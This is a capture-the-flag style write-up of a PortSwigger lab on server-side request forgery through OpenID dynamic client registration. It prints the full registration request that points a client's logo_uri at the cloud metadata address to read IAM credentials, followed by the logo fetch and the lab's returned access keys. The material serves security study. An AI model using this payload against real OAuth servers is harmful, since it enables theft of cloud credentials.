# [SSRF via OpenID dynamic client registration] — [PortSwigger] — [Practitioner]
**Date:** 2026-07-22
 
---
 
## Vulnerability / core concept
OAuth

---


## Payload / key command
This web application uses social profile to log in the user. For this purpose OAuth authentication is implemented. After proxying and inspecting the requests, we can go to the OAuth server and check `/.well-known/openid-configuration` endpoint to see the important endpoints of this oauth server. The one we are looking for is `/reg` endpoint which helps to dynamically register clients. However, there is a vulnerability: the server does not check authentication and allows anyone to be registered as a client appliction for this server. We can do this by sending POST request with JSON body that contains `redirect_uris` set to some dummy uri to satisfy the request. 

Another thing that worth attention is happening during OAuth flow when OAuth server fetches the logo from its own server and tries to display it on `Authorize` page. To exploit all these information we can send the following request:
```bash
POST /reg HTTP/1.1
Host: oauth-0a4000c20347a9ab80882ee602e200ad.oauth-server.net
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:152.0) Gecko/20100101 Firefox/152.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://oauth-0a4000c20347a9ab80882ee602e200ad.oauth-server.net/.well-known/openid-configuration
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Type: application/json
Content-Length: 126

{"redirect_uris":["https://babek.com"],
"logo_uri":"http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"}
```
This returns us the following details:
```bash
HTTP/1.1 201 Created
X-Powered-By: Express
Pragma: no-cache
Cache-Control: no-cache, no-store
Content-Type: application/json; charset=utf-8
Date: Wed, 22 Jul 2026 19:36:28 GMT
Connection: keep-alive
Keep-Alive: timeout=15
Content-Length: 948

{"application_type":"web","grant_types":["authorization_code"],"id_token_signed_response_alg":"RS256","post_logout_redirect_uris":[],"require_auth_time":false,"response_types":["code"],"subject_type":"public","token_endpoint_auth_method":"client_secret_basic","introspection_endpoint_auth_method":"client_secret_basic","revocation_endpoint_auth_method":"client_secret_basic","require_signed_request_object":false,"request_uris":[],"client_id_issued_at":1784748988,"client_id":"G2InTVLNrD0loks2m3BFD","client_secret_expires_at":0,"client_secret":"bANkzgThh73PTKKr2a3iAj5HB4sRtbaZoQoNEZF6S7Ze9kbHXt5RvRN-rl7CidIaFQAVusGNsUjz4wMfV8EWUQ","logo_uri":"http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/","redirect_uris":["https://babek.com"],"registration_client_uri":"http://oauth-0a4000c20347a9ab80882ee602e200ad.oauth-server.net/reg/G2InTVLNrD0loks2m3BFD","registration_access_token":"tCqG4hwHIaotuhrCfpQHoPla4v4ixT9e6ST9csThv79"}
```
Now, we can use the following `client_id` to make server retrieve the logo for this client, when in reality it will retrieve the credentials for admin with secret key:
```bash
GET /client/G2InTVLNrD0loks2m3BFD/logo HTTP/2
Host: oauth-0a4000c20347a9ab80882ee602e200ad.oauth-server.net
Cookie: _session=vOtOb6LtrKZrJLKZnb34b; _session.legacy=vOtOb6LtrKZrJLKZnb34b
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:152.0) Gecko/20100101 Firefox/152.0
Accept: image/avif,image/webp,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Referer: https://oauth-0a4000c20347a9ab80882ee602e200ad.oauth-server.net/interaction/BLxtOw6s4Xr4YCCnRcrLs
Sec-Fetch-Dest: image
Sec-Fetch-Mode: no-cors
Sec-Fetch-Site: same-origin
Priority: u=4, i
Te: trailers
```
This request will result in the following output:
```js
{
  "Code" : "Success",
  "LastUpdated" : "2026-07-22T19:31:17.198582512Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "tddIwHrqFrBHD0bGHqMj",
  "SecretAccessKey" : "9q4VHkR3rVpo15e7eOYjXsUz3WK7eKoAd8OeE9Tb",
  "Token" : "3JqZkwuSwBrGFw9OHp8CjAS5MOh9j0I8ZeYjv9VLQ1ZhJeP3q9laD7vJ4tssUQSF99WWNp8hnxnIaSQCKxOrlKXUTG4pKpDVFdGr3WTc7EUKnMq2aG2E2WbWt12HxSNRjjj05ArnVhYWZR6B6pCoNEdLWWyrVE47yXauHgPW1xyWxXrGVIDtes5kZoAVnketTXbuwgMVbhKqlTWiRNGDpS7kUF7iFgcu5KFlRCGvLIIEvxr5CS7CUppWc9tlYWYF",
  "Expiration" : "2032-07-20T19:31:17.198582512Z"
}
```
Now we can submit the secret access key and solve the lab.

Note: Burp Collaborator in this lab is required for diagnostic reasons: we made sure that server actually makes request to the `logo_uri` provided by us.
